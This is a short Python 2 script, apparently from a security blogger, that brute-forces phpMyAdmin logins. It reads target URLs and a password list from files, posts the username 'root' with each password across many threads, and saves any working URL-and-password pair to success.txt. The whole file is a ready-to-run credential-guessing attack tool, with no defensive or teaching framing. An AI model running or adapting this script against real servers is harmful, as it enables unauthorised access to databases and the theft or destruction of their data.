# -*- coding: utf-8 -*-
# @Time    : 2018/4/17 0017 19:09
# @Author  : Langzi
# @Blog    : www.langzi.fun
# @File    : brute_phpmyadmin.py
# @Software: PyCharm
import sys
import requests
from multiprocessing.dummy import Pool as ThreadPool
reload(sys)
sys.setdefaultencoding('utf-8')
smxc = int(input(unicode('设置扫描线程数(10-500):','utf-8').encode('gbk')))
password = list(set([i.replace("\n", "") for i in open("password.txt", "r").readlines()]))
iplist = list(set([i.replace("\n","") for i in open("url.txt","r").readlines()]))
def scan(url):
    for mimx in password:
        mima = str(mimx)
        data = {'pma_username': str('root'), 'pma_password': str(mima)}
        try:
            r = requests.post(url=url,data=data,timeout=10)
            shuchu=str(url)+'|'+ 'root:'+str(mima)
            print 'Cheaking>>>' +str(shuchu)
            if 'mainFrameset' in r.content:
                with open('success.txt','a+')as a:
                    a.write(str(shuchu)+'\n')
                    return ''
            else:
                pass
        except Exception,e:
            print e
pool = ThreadPool(processes=int(smxc))
result = pool.map(scan, iplist)
pool.close()
pool.join()